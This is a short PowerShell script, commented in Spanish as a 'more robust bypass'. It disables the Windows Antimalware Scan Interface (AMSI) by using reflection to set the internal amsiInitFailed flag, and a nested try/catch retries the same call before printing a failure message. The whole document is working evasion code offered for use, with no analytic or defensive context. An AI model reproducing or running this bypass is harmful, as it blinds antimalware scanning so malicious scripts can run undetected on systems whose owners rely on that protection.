# Bypass más robusto
try {
    # Intentar método 1
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    } catch {
        Write-Host "❌ AMSI bypass failed" -ForegroundColor Red
    }
}
